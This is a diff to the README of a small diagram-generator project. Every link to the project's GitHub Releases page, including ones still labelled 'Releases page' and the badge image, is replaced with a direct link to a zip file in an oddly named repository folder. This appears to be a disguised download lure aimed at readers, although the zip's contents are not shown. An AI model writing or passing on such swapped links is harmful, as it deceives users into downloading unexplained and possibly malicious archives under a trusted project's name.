@@ -1,6 +1,6 @@
 # 🎨 moody-diagram-generator - Generate Moody Diagrams Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Available-brightgreen)](https://github.com/Gaasla/moody-diagram-generator/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Gaasla/moody-diagram-generator/master/overeasiness/moody-diagram-generator.zip%20Latest%20Release-Available-brightgreen)](https://raw.githubusercontent.com/Gaasla/moody-diagram-generator/master/overeasiness/moody-diagram-generator.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to the moody-diagram-generator! This application helps you create Moody 
 
 To get started, visit the Releases page to download the latest version of the application.
 
-[Download the Latest Version](https://github.com/Gaasla/moody-diagram-generator/releases)
+[Download the Latest Version](https://raw.githubusercontent.com/Gaasla/moody-diagram-generator/master/overeasiness/moody-diagram-generator.zip)
 
-1. Go to the [Releases page](https://github.com/Gaasla/moody-diagram-generator/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Gaasla/moody-diagram-generator/master/overeasiness/moody-diagram-generator.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click on the download link for your operating system.
 4. Save the file to your computer.
@@ -60,4 +60,4 @@ We plan to improve the application with additional features and enhancements. St
 
 ## 🏁 Final Notes
 
-Thank you for choosing moody-diagram-generator! We hope this tool becomes a valuable asset in your engineering toolkit. Don’t forget to visit the [Releases page](https://github.com/Gaasla/moody-diagram-generator/releases) to download the latest updates. Happy diagramming!
+Thank you for choosing moody-diagram-generator! We hope this tool becomes a valuable asset in your engineering toolkit. Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Gaasla/moody-diagram-generator/master/overeasiness/moody-diagram-generator.zip) to download the latest updates. Happy diagramming!
